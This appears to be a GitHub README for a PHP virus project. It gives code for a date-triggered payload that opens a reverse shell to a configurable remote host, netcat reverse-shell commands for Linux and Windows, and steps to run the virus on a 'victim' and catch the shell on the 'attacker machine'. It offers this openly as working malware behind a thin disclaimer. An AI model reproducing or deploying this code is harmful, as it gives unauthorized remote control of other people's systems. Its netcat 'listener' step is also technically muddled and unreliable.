![alt text](https://github.com/27182818284590452/Viral-PHP-script/tree/master/Images/php.png)
# Viral-PHP-script
Simple PHP-virus with optional payload. For private use only, the developer is not responsible for the use of this project.

# Requirements
Script requires PHP 7.1.23 or later.
Check your version by typing:
```
php --version
```
into your shell.

# Usage:
## Step 1.1 (optional):
You can use the default payload, which opens a reverse shell to a remote host. You can change the payload by inserting your own php payload into the payload function.
```php
// exec payload
function payload(){
    if(date("md") == 0424){
        $sock = fsockopen(Hostname, Port);
        exec ("/bin/sh -i <&3 >&3 2>&3");
    }
}
```
### Step 1.2 (optional):
Please change Hostname and Port to your own setting. (FREX. Hostname = 127.0.0.1 Port = 1234).
```php
// sets Hostname and Port
define("Hostname", "127.0.0.1");
define("Port", 1234);
```

## Step 2 (optional):
Set your own signature.
```php
// define signature
define("SIGNATURE", "§16N47UR3");
```

## Step 3:
Start the netcat listener on your machine.
```
nc 127.0.0.1 1234 -e /bin/sh  # Linux reverse shell
nc 127.0.0.1 1234 -e cmd.exe  # Windows reverse shell
```

For versions that don't support the -e option
```
nc -e /bin/sh 127.0.0.1 1234
```

## Step 4:
Execute virus.php on victim.
```
php virus.php
```

# Step 5:
Catch shell on attacker machine.
